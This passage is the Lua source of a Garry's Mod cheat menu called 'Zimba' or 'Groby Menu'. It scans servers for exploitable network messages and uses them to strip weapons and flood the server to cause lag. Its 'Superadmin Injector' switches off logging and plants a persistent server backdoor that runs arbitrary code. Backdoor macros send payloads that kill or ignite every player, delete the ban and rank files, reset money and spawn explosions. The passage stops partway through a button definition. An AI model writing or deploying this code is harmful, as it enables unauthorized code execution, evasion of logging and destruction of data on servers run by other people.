
------------------------------
--       FUNCTIONS          --
------------------------------
Version = "v1"
netKey = "nostrip"

totalExploits = 0
BackdoorsFound = 0

local ply = LocalPlayer()

local function DrawBlur(panel, amount) --Panel blur function
end

function ValidNetString( str )
    local status, error = pcall( net.Start, str )
    return status
end

local function playSound(url)
    sound.PlayURL(url, '', function( station ) 
        if ( IsValid( station ) ) then
        station:SetPos( LocalPlayer():GetPos() )
        station:Play()
        end
    end)
end

hook.Add("Think", "RAINBOWPLAYER", function()
local RainbowPlayer = HSVToColor( CurTime() % 6 * 60, 1, 1 )
    LocalPlayer():SetWeaponColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
    LocalPlayer():SetPlayerColor( Vector( RainbowPlayer.r / 255, RainbowPlayer.g / 255, RainbowPlayer.b / 255 ) )
end)

function HtxPooledString()
        if IsMessagePooled( netKey ) then return "Detected!"
        else return "Not Detected!"
    end
end


function IsMessagePooled( netmessage )
    BackdoorStatus, error = pcall(net.Start,netmessage)
    return BackdoorStatus
end

local SW = {}
SW.Enabled = false
SW.ViewOrigin = Vector( 0, 0, 0 )
SW.ViewAngle = Angle( 0, 0, 0 )
SW.Velocity = Vector( 0, 0, 0 )
 
function SW.CalcView( ply, origin, angles, fov )
    if ( !SW.Enabled ) then return end
        if ( SW.SetView ) then
        SW.ViewOrigin = origin
        SW.ViewAngle = angles
        SW.SetView = false
        end
    return { origin = SW.ViewOrigin, angles = SW.ViewAngle }
end
hook.Add( "CalcView", "SpiritWalk", SW.CalcView )
 
function SW.CreateMove( cmd )
    if ( !SW.Enabled ) then return end
           
    local time = FrameTime()
    SW.ViewOrigin = SW.ViewOrigin + ( SW.Velocity * time )
    SW.Velocity = SW.Velocity * 0.95

    local sensitivity = 0.022
    SW.ViewAngle.p = math.Clamp( SW.ViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
    SW.ViewAngle.y = SW.ViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
           

    local add = Vector( 0, 0, 0 )
    local ang = SW.ViewAngle
    if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
    if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
    if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
    if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
    if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
    if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
    add = add:GetNormal() * time * 3000
    if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 2 end
           
    SW.Velocity = SW.Velocity + add
    if ( SW.LockView == true ) then
      SW.LockView = cmd:GetViewAngles()
    end
    if ( SW.LockView ) then
        cmd:SetViewAngles( SW.LockView )
    end
    cmd:SetForwardMove( 0 )
    cmd:SetSideMove( 0 )
    cmd:SetUpMove( 0 )
end


hook.Add( "CreateMove", "SpiritWalk", SW.CreateMove )
    function SW.Toggle()
    SW.Enabled = !SW.Enabled
    SW.LockView = SW.Enabled
    SW.SetView = true
           
    local status = { [ true ] = "ON", [ false ] = "OFF" }
    SploitNotify("Noclip: " .. status[ SW.Enabled ])
end
concommand.Add( "zimba_toggle_noclip", SW.Toggle )



-- Exploit Other Shit

if( ValidNetString("start_wd_emp") ) then
    totalExploits = 1 + totalExploits 
end

if( ValidNetString("properties") ) then
    totalExploits = 1 + totalExploits
end

if( ValidNetString("egg") ) then
    totalExploits = 1 + totalExploits
end

if( ValidNetString("steamid2") ) then
    totalExploits = 1 + totalExploits
end

if( ValidNetString("bodyman_model_change") ) then
    totalExploits = 1 + totalExploits
end
------------------------------
--    EXPLOIT FUNCTIONS     --
------------------------------


function SploitNotify(text)
    local notify = vgui.Create( "DPanel" )
    notify:SetSize( 200, 50 )
    notify:SetPos( ScrW() - 200, -50 )
    notify.Paint = function(self, w, h)
    draw.RoundedBox( 0, 0, 0, w, h, Color(20, 20, 20))
    draw.RoundedBox( 0, 0, notify:GetTall() - 2, w, 2, HSVToColor( CurTime() % 6 * 60, 1, 1 ))
    draw.SimpleText( text, "Title", notify:GetWide() / 2, notify:GetTall() / 2, Color(255, 255, 255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
    end
    notify:MoveTo( ScrW() - notify:GetWide(), 0, .2, 0, -1, function()
    timer.Simple( 3, function()
    notify:MoveTo( ScrW() - notify:GetWide(), -50, .2, 0, -1)
end);end) end


-- Exploit 1
function removeAll() -- Strips all Players
    for k,v in pairs(player.GetAll()) do
        stripPlayer(v)
    end
end

function stripPlayer(ply) -- Strip player function
    if ply:IsPlayer() then
        for k,v in pairs(ply:GetWeapons()) do
            net.Start("properties")
            net.WriteString( "remove" , 32 )
            net.WriteEntity( v )
            net.SendToServer()
        end
    end
end

-- Exploit 2
function HackKeypad()
    net.Start('start_wd_emp') 
    net.SendToServer()
end

-- Exploit 3

function GiveEasterEgg1()
    net.Start("egg")
    net.SendToServer()
    SploitNotify("Gave Easter Egg")

end

-- Exploit 4

function Lagger1()
    timer.Create( "lagger9", 0, 0, function()
        for i = 1, 100 do
        net.Start( "steamid2" )
        net.WriteString( "Zimba Hack Menu" )
        net.SendToServer()
        end
    end)
end


-- Exploit 5

local PM = 1
local SK = 1
local BG = 1
local HN = 1
local TS = 1
local GL = 1
local LG = 1

function BodyGroups()
    PlayerModels = {0,1,2,3,4,5,6}
    Torso = {0,1,2,3,4,5,6,7,8,9,10}
    Legs = {0,1,2,3,4,5,6}
    Hands = {0,1,2}
    Glasses = {0,1}
    Skins = {0,1,2,3,4,5,6,7,8,9,10}
    PM = PM+1
    TS = TS+1
    LG = LG+1  
    HN = HN+1
    GL = GL+1
    SK = SK+1
    if (PM>#PlayerModels) then PM=1 end
    if (SK>#Skins) then SK=1 end
    if (HN>#Hands) then HN=1 end
    if (TS>#Torso) then TS=1 end
    if (GL>#Glasses) then GL=1 end
    if (LG>#Legs) then LG=1 end
    net.Start("bodyman_model_change")
      net.WriteInt(PlayerModels[PM], 10 )
      net.SendToServer()
    net.Start("bodygroups_change")
      net.WriteTable( { 1, Torso[TS] } )
      net.SendToServer()
    net.Start("bodygroups_change")
      net.WriteTable( { 2, Legs[LG] } )
      net.SendToServer()
    net.Start("bodygroups_change")
      net.WriteTable( { 3, Hands[HN] } )
      net.SendToServer()
    net.Start("bodygroups_change")
      net.WriteTable( { 4, Glasses[GL] } )
      net.SendToServer()
end


local MC = {}
MC.Enabled = false

function ChangeModelSpammer()
    if ( MC.Enabled ) then return end
        timer.Create( "modelchanger", 0.3, 0, function()
        BodyGroups()
    end )
end

hook.Add("Think","modelchanger",ChangeModelSpammer)
    
function MC.Toggle()
    MC.Enabled = !MC.Enabled
    MC.LockView = MC.Enabled
    MC.SetView = true

    local status = { [ true ] = "ON", [ false ] = "OFF" }
    SploitNotify("Model Changer: " .. status[ MC.Enabled ])
end
concommand.Add( "zimba_toggle_model_changer", MC.Toggle )




-- Superadmin Injector
function Inject()
    chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Injecting..." )
    if ( ply:IsSuperAdmin() ) then
        timer.Simple( 3, function() 
            if( ValidNetString("ZimbaBackDoor") ) then
            
            else
                RunConsoleCommand( "ulx", "logecho", "0" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString ('ZimbaBackDoor')" )
                RunConsoleCommand( "ulx", "luarun", "util.AddNetworkString('ZimbaBackDoor') net.Receive('ZimbaBackDoor', function( length, ply ) local netString = net.ReadString() local bit = net.ReadBit() if bit == 1 then RunString(netString) else game.ConsoleCommand(netString .. '\n') end end)" )
                RunConsoleCommand( "ulx", "logecho", "1" )
                chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 0, 255, 0 )," Successfully Injected!" )
            end
        end )
    else
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 0, 0 )," Failed! Your Not Superadmin!" )
    end
    if( ValidNetString("ZimbaBackDoor") ) then
        chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 255, 255 )," Backdoor is already in! Fire at will!" )
    end
end


------------------------------
--          FONTS           --
------------------------------

surface.CreateFont( "Title", {
        font = "Lato Light",
        size = 30,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "Status", {
        font = "Lato Light",
        size = 25,
        weight = 250,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "Welcome", {
        font = "Lato Light",
        size = 25,
        weight = 10,
        antiaalias = true,
        strikeout = false,
        additive = true,
} )

surface.CreateFont( "ESP", {
        font = "Lato Light",
        size = 15,
        weight = 250,
        antialias = true,
        strikeout = false,
        additive = true,
} )
------------------------------
--     Groby Menu DERMA     --
------------------------------


local Zimba = vgui.Create( "DFrame" )
Zimba:SetSize( 630, 450 )
Zimba:SetVisible( true )
Zimba:SetDraggable( true )
Zimba:ShowCloseButton( false )
Zimba:Center()
Zimba:SetTitle("")
Zimba:MakePopup()
Zimba.Paint = function( self, w, h )
    DrawBlur(Zimba, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
    draw.SimpleText( "Groby Menu", "Title", Zimba:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
end


local ZimbaCategories = vgui.Create( "DFrame", LOL )
ZimbaCategories:SetSize( 150, 450 )
ZimbaCategories:SetVisible( true )
ZimbaCategories:SetDraggable( true)
ZimbaCategories:ShowCloseButton( false )
ZimbaCategories:SetPos( 465, 315)
ZimbaCategories:SetTitle("")
ZimbaCategories:MakePopup()
ZimbaCategories.Paint = function( self, w, h )
    DrawBlur(ZimbaCategories, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
    draw.SimpleText( "Catagories", "Title", ZimbaCategories:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
end

local ZimbaClose = vgui.Create( "DButton", Zimba )
ZimbaClose:SetSize( 35, 35 )
ZimbaClose:SetPos( Zimba:GetWide() - 36,9 )
ZimbaClose:SetText( "X" )
ZimbaClose:SetFont( "Default" )
ZimbaClose:SetTextColor( Color( 255, 255, 255 ) )
ZimbaClose.Paint = function()
        
end
ZimbaClose.DoClick = function()
    CloseEverything()
end


-- Version Derma / Checker Name / Welcome Message

local WelcomeLabel = vgui.Create( "DLabel", Zimba )
WelcomeLabel:SetPos( 100, 100 )
WelcomeLabel:SetFont("Welcome")
WelcomeLabel:SetText( "Hello,  "..ply:GetName().."\nThank you for using Groby Hack We will be \nUpdating our hack so click the 'Check Version' Button to see \n if you have the right version :)")
WelcomeLabel:SizeToContents()

local TotalExploits = vgui.Create( "DLabel", Zimba )
TotalExploits:SetPos( 230, 425 )
TotalExploits:SetText( "Total Exploits: "..totalExploits.." |" )
TotalExploits:SizeToContents()

local BackdoorStatus = vgui.Create( "DLabel", Zimba )
BackdoorStatus:SetPos( 320, 425 )
BackdoorStatus:SetText( "Backdoor: "..HtxPooledString() )
BackdoorStatus:SizeToContents()
--
if IsMessagePooled( netKey ) then BackdoorStatus:SetTextColor( Color(0,255,0) ) else BackdoorStatus:SetTextColor( Color(255,0,0) ) end
--


local VersionLabel = vgui.Create( "DLabel", Zimba )
VersionLabel:SetPos( 550, 425 )
VersionLabel:SetText( "Version: "..Version )

local NameLabel = vgui.Create( "DLabel", Zimba )
NameLabel:SetPos( 10, 425 )
NameLabel:SetText( "Hello, "..ply:GetName().."!" )
NameLabel:SizeToContents()

-- Check Version Button


local Checkversion = vgui.Create( "DButton", Zimba )
Checkversion:SetText( "Check Version" )
Checkversion:SizeToContents()
Checkversion:SetTall( 25 )
Checkversion:SetWide( 100 )
Checkversion:SetPos( 250, 275 )
Checkversion:SetTextColor( Color( 255, 255, 255 ) )
Checkversion:SetToolTip( "Checks the hack Client Version." )
Checkversion.Paint = function( self, w, h )
    DrawBlur(Checkversion, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
Checkversion.DoClick = function()
    if ( Version == "v3.8") then
            chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 0, 255, 0 )," Version is up to date!" )
    else
            chat.AddText( Color( 0, 0, 0, 125 ), "[ZIMBA]", Color( 255, 0, 0 )," Out of date!" )
    end
    end
end

-- Check Backdoors Button

local BackdoorScanner = vgui.Create( "DButton", Zimba )
BackdoorScanner:SetText( "Backdoor Scanner" )
BackdoorScanner:SizeToContents()
BackdoorScanner:SetTall( 25 )
BackdoorScanner:SetWide( 100 )
BackdoorScanner:SetPos( 185, 315 )
BackdoorScanner:SetTextColor( Color( 255, 255, 255 ) )
BackdoorScanner:SetToolTip( "Checks the hack Client Version." )
BackdoorScanner.Paint = function( self, w, h )
    DrawBlur(BackdoorScanner, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
BackdoorScanner.DoClick = function()
    SploitNotify("Scanning...")
    surface.PlaySound("buttons/blip1.wav") 
    checkbackdoors()

    end
end

-- Check Injector Button

local Injector = vgui.Create( "DButton", Zimba )
Injector:SetText( "Superadmin Injector" )
Injector:SizeToContents()
Injector:SetTall( 25 )
Injector:SetWide( 115 )
Injector:SetPos( 300, 315 )
Injector:SetTextColor( Color( 255, 255, 255 ) )
Injector:SetToolTip( "Checks the hack Client Version." )
Injector.Paint = function( self, w, h )
    DrawBlur(Injector, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
Injector.DoClick = function()
    SploitNotify("Injecting...")
    surface.PlaySound("buttons/blip1.wav") 
    Inject()

    end
end



------------------------------
--    Groby Menu BUTTONS    --
------------------------------
local MainMenuButton = vgui.Create( "DButton", ZimbaCategories )
MainMenuButton:SetText( "Main Menu" )
MainMenuButton:SizeToContents()
MainMenuButton:SetTall( 50 )
MainMenuButton:SetWide( MainMenuButton:GetWide() + 100 )
MainMenuButton:SetPos( 0, 75 )
MainMenuButton:SetTextColor( Color( 255, 255, 255 ) )
MainMenuButton:SetToolTip( "Main Menu" )
MainMenuButton.Paint = function( self, w, h )
    DrawBlur(MainMenuButton, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
MainMenuButton.DoClick = function()
        closealltabs()
        ply:ConCommand( "zimba_menu" )
    end
end

local ExploitMenuButton = vgui.Create( "DButton", ZimbaCategories )
ExploitMenuButton:SetText( "Exploit Menu" )
ExploitMenuButton:SizeToContents()
ExploitMenuButton:SetTall( 50 )
ExploitMenuButton:SetWide( ExploitMenuButton:GetWide() + 100 )
ExploitMenuButton:SetPos( 0, 140 )
ExploitMenuButton:SetTextColor( Color( 255, 255, 255 ) )
ExploitMenuButton:SetToolTip( "Exploit Menu" )
ExploitMenuButton.Paint = function( self, w, h )
    DrawBlur(ExploitMenuButton, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
ExploitMenuButton.DoClick = function()
        closealltabs()
        ply:ConCommand( "zimba_exploit_menu" )
    end
end

local MiscMenuButton = vgui.Create( "DButton", ZimbaCategories )
MiscMenuButton:SetText( "Misc Menu" )
MiscMenuButton:SizeToContents()
MiscMenuButton:SetTall( 50 )
MiscMenuButton:SetWide( MiscMenuButton:GetWide() + 100 )
MiscMenuButton:SetPos( 0, 205 )
MiscMenuButton:SetTextColor( Color( 255, 255, 255 ) )
MiscMenuButton:SetToolTip( "Misc Menu" )
MiscMenuButton.Paint = function( self, w, h )
    DrawBlur(MiscMenuButton, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
MiscMenuButton.DoClick = function()
        closealltabs()
        ply:ConCommand( "zimba_misc_menu" )

    end
end

local BackdoorButton = vgui.Create( "DButton", ZimbaCategories )
BackdoorButton:SetText( "Backdoor Menu" )
BackdoorButton:SizeToContents()
BackdoorButton:SetTall( 50 )
BackdoorButton:SetWide( BackdoorButton:GetWide() + 100 )
BackdoorButton:SetPos( 0, 270 )
BackdoorButton:SetTextColor( Color( 255, 255, 255 ) )
BackdoorButton:SetToolTip( "Misc Menu" )
BackdoorButton.Paint = function( self, w, h )
    DrawBlur(BackdoorButton, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
BackdoorButton.DoClick = function()
        closealltabs()
        ply:ConCommand( "zimba_backdoor_menu" )

    end
end


------------------------------
--      BACKDOOR DERMA      --
------------------------------


local BackdoorMenu = vgui.Create( "DFrame" )
BackdoorMenu:SetSize( 630, 450 )
BackdoorMenu:SetVisible( true )
BackdoorMenu:SetDraggable( true)
BackdoorMenu:ShowCloseButton( false )
BackdoorMenu:Center()
BackdoorMenu:SetTitle("")
BackdoorMenu:MakePopup()
BackdoorMenu.Paint = function( self, w, h )
    DrawBlur(BackdoorMenu, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 85))
    draw.RoundedBox(0, 2, 2, w - 4, h / 9, Color(0,0,0,125))
    draw.SimpleText( "Zimba Backdoor Menu", "Title", BackdoorMenu:GetWide() / 2, 6, HSVToColor( CurTime() % 6 * 60, 1, 1 ), TEXT_ALIGN_CENTER )
    draw.SimpleText( "Macros", "Title", BackdoorMenu:GetWide() / 2, 225, Color(255,255,255,255), TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
end


local BackdoorMenuClose = vgui.Create( "DButton", BackdoorMenu )
BackdoorMenuClose:SetSize( 35, 35 )
BackdoorMenuClose:SetPos( BackdoorMenu:GetWide() - 36,9 )
BackdoorMenuClose:SetText( "X" )
BackdoorMenuClose:SetFont( "Default" )
BackdoorMenuClose:SetTextColor( Color( 255, 255, 255 ) )
BackdoorMenuClose.Paint = function()

end
BackdoorMenuClose.DoClick = function()
    CloseEverything()
end



------------------------------
--        BACKDOOR          --
------------------------------

local Consolerun = vgui.Create( "DTextEntry", BackdoorMenu )
    Consolerun:SetText( strDefaultText or "" )
    Consolerun:SetPos( 125, 100)
    Consolerun:SetSize( 350, 20 )
    Consolerun.OnEnter = function() Window:Close() Consolerun:GetValue() 
end


local RunCommand = vgui.Create( "DButton", BackdoorMenu )
    RunCommand:SetText( "OK" )
    RunCommand:SetSize( 55, 25 )
    RunCommand:SetPos( 230, 150 )
    RunCommand:SetTextColor( Color( 255, 255, 255 ) )
    RunCommand.DoClick = function()  
        SploitNotify("Sending Command")
        surface.PlaySound("buttons/blip1.wav") 
		if ValidNetString( netKey ) then
        net.Start( netKey )   net.WriteString( Consolerun:GetValue()  ) net.SendToServer() 
		else
		SploitNotify("netkey invalid or smth idk")
		end
 end

RunCommand.Paint = function( self, w, h )
    DrawBlur(RunCommand, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
end

local Disco = vgui.Create( "DButton", BackdoorMenu )
    Disco:SetText( "Disco" )
    Disco:SetSize( 55, 25 )
    Disco:SetPos( 320, 150 )
    Disco:SetTextColor( Color( 255, 255, 255 ) )
    Disco.DoClick = 
        function()  surface.PlaySound("buttons/blip1.wav") net.Start( netKey )   net.WriteString( Consolerun:GetValue()  ) net.SendToServer() 
        SploitNotify("Starting Disco")
        local disco = "for k,v in pairs(player.GetAll()) do v:SendLua([[ local function playSound(url) sound.PlayURL(url, '', function( station ) if ( IsValid( station ) ) then station:SetPos( LocalPlayer():GetPos() ) station:Play() end end) end playSound('http://www.underdone.org/leak/underdone/blue.mp3')  ]]) end"
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( disco )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end

end
Disco.Paint = function( self, w, h )
    DrawBlur(Disco, 2)
    draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
end

local Status = vgui.Create( "DLabel", BackdoorMenu )
    Status:SetText("Status: "..HtxPooledString() )
    Status:SetPos( 380,410 )
    Status:SetFont("Status")
    Status:SizeToContents()
    Status:SetContentAlignment( 5 )
    Status:SetTextColor( Color(255,50,50,255) )

--
if IsMessagePooled( netKey ) then Status:SetTextColor( Color(0,255,0) ) else Status:SetTextColor( Color(255,0,0) ) end
--

------------------------------
--     BACKDOOR MACROS      --
------------------------------


local KillEveryone = vgui.Create( "DButton", BackdoorMenu )
    KillEveryone:SetText( "Kill Everyone" )
    KillEveryone:SizeToContents()
    KillEveryone:SetTall( 25 )
    KillEveryone:SetWide( KillEveryone:GetWide() + 25 )
    KillEveryone:SetPos( 50, 250 )
    KillEveryone:SetTextColor( Color( 255, 255, 255 ) )
    KillEveryone:SetToolTip( "Kills everyone in the server!" )
    KillEveryone.Paint = function( self, w, h )
        DrawBlur(KillEveryone, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    KillEveryone.DoClick = function()
        SploitNotify("Killing Everyone")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end

local LaunchEveryone = vgui.Create( "DButton", BackdoorMenu )
    LaunchEveryone:SetText( "Launch Everyone" )
    LaunchEveryone:SizeToContents()
    LaunchEveryone:SetTall( 25 )
    LaunchEveryone:SetWide( LaunchEveryone:GetWide() + 20 )
    LaunchEveryone:SetPos( 160, 250 )
    LaunchEveryone:SetTextColor( Color( 255, 255, 255 ) )
    LaunchEveryone:SetToolTip( "Launches everyone on the server" )
    LaunchEveryone.Paint = function( self, w, h )
        DrawBlur(LaunchEveryone, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    LaunchEveryone.DoClick = function()
        SploitNotify("Launching Players")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local EarRape = vgui.Create( "DButton", BackdoorMenu )
    EarRape:SetText( "Ear Rape" )
    EarRape:SizeToContents()
    EarRape:SetTall( 25 )
    EarRape:SetWide( EarRape:GetWide() + 20 )
    EarRape:SetPos( 285, 250 )
    EarRape:SetTextColor( Color( 255, 255, 255 ) )
    EarRape:SetToolTip( "Starts a very loud sound on the server." )
    EarRape.Paint = function( self, w, h )
        DrawBlur(EarRape, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    EarRape.DoClick = function()
        SploitNotify("Starting Ear Rape")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local IngiteEveryone = vgui.Create( "DButton", BackdoorMenu )
    IngiteEveryone:SetText( "Ignite Everyone" )
    IngiteEveryone:SizeToContents()
    IngiteEveryone:SetTall( 25 )
    IngiteEveryone:SetWide( EarRape:GetWide() + 25 )
    IngiteEveryone:SetPos( 370, 250 )
    IngiteEveryone:SetTextColor( Color( 255, 255, 255 ) )
    IngiteEveryone:SetToolTip( "Ignites Everyon on the server." )
    IngiteEveryone.Paint = function( self, w, h )
        DrawBlur(IngiteEveryone, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    IngiteEveryone.DoClick = function()
        SploitNotify("Igniting Everyone")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local DeleteBans = vgui.Create( "DButton", BackdoorMenu )
    DeleteBans:SetText( "Delete Bans" )
    DeleteBans:SizeToContents()
    DeleteBans:SetTall( 25 )
    DeleteBans:SetWide( DeleteBans:GetWide() + 20 )
    DeleteBans:SetPos( 480, 250 )
    DeleteBans:SetTextColor( Color( 255, 255, 255 ) )
    DeleteBans:SetToolTip( "Deletes all Bans!" )
    DeleteBans.Paint = function( self, w, h )
        DrawBlur(DeleteBans, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    DeleteBans.DoClick = function()
        SploitNotify("Deleting Bans")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local DeleteRanks = vgui.Create( "DButton", BackdoorMenu )
    DeleteRanks:SetText( "Delete ULX Ranks" )
    DeleteRanks:SizeToContents()
    DeleteRanks:SetTall( 25 )
    DeleteRanks:SetWide( DeleteRanks:GetWide() + 20 )
    DeleteRanks:SetPos( 50, 295 )
    DeleteRanks:SetTextColor( Color( 255, 255, 255 ) )
    DeleteRanks:SetToolTip( "Deletes ULX Groups / Ranks!" )
    DeleteRanks.Paint = function( self, w, h )
        DrawBlur(DeleteRanks, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    DeleteRanks.DoClick = function()
        SploitNotify("Deleting ULX")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local ResetMoney = vgui.Create( "DButton", BackdoorMenu )
    ResetMoney:SetText( "Reset RP Money" )
    ResetMoney:SizeToContents()
    ResetMoney:SetTall( 25 )
    ResetMoney:SetWide( ResetMoney:GetWide() + 20 )
    ResetMoney:SetPos( 180, 295 )
    ResetMoney:SetTextColor( Color( 255, 255, 255 ) )
    ResetMoney:SetToolTip( "Resets all DarkRP Money" )
    ResetMoney.Paint = function( self, w, h )
        DrawBlur(ResetMoney, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    ResetMoney.DoClick = function()
        SploitNotify("Reseting Money")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "rp_resetallmoney")
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local Physics = vgui.Create( "DButton", BackdoorMenu )
    Physics:SetText( "Physics" )
    Physics:SizeToContents()
    Physics:SetTall( 25 )
    Physics:SetWide( Physics:GetWide() + 20 )
    Physics:SetPos( 300, 295 )
    Physics:SetTextColor( Color( 255, 255, 255 ) )
    Physics:SetToolTip( "Changes the physics." )
    Physics.Paint = function( self, w, h )
        DrawBlur(Physics, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    Physics.DoClick = function()
        SploitNotify("Chaning Physics")
        surface.PlaySound("garrysmod/ui_click.wav")
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( "sv_friction -8" )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end


local ArtilleryStrike = vgui.Create( "DButton", BackdoorMenu )
    ArtilleryStrike:SetText( "Artillery Strike" )
    ArtilleryStrike:SizeToContents()
    ArtilleryStrike:SetTall( 25 )
    ArtilleryStrike:SetWide( ArtilleryStrike:GetWide() + 20 )
    ArtilleryStrike:SetPos( 375, 295 )
    ArtilleryStrike:SetTextColor( Color( 255, 255, 255 ) )
    ArtilleryStrike:SetToolTip( "Bombs drop everywhere." )
    ArtilleryStrike.Paint = function( self, w, h )
        DrawBlur(ArtilleryStrike, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
    ArtilleryStrike.DoClick = function()
        SploitNotify("Starting Strike")
        surface.PlaySound("garrysmod/ui_click.wav")
        local strike = "hook.Add(\"Think\", \"bombstrike\", function() \n local explode = ents.Create( \"env_explosion\" ) \n explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) ) explode:Spawn() explode:SetKeyValue( \"iMagnitude\", \"500\" ) explode:Fire( \"Explode\", 0, 0 ) end)"
		if ValidNetString(netKey) then
        net.Start(netKey)
        net.WriteString( strike )
        net.WriteBit(1)
        net.SendToServer()
		else
		SploitNotify("netkey invalid or smth idk")
		end
    end
end

local StopArtilleryStrike = vgui.Create( "DButton", BackdoorMenu )
    StopArtilleryStrike:SetText( "Stops Strike" )
    StopArtilleryStrike:SizeToContents()
    StopArtilleryStrike:SetTall( 25 )
    StopArtilleryStrike:SetWide( StopArtilleryStrike:GetWide() + 20 )
    StopArtilleryStrike:SetPos( 480, 295 )
    StopArtilleryStrike:SetTextColor( Color( 255, 255, 255 ) )
    StopArtilleryStrike:SetToolTip( "Stops Artillery Strike" )
    StopArtilleryStrike.Paint = function( self, w, h )
        DrawBlur(StopArtilleryStrike, 2)
        draw.RoundedBox(0, 0, 0, w, h, Color(0, 0, 0, 125) )
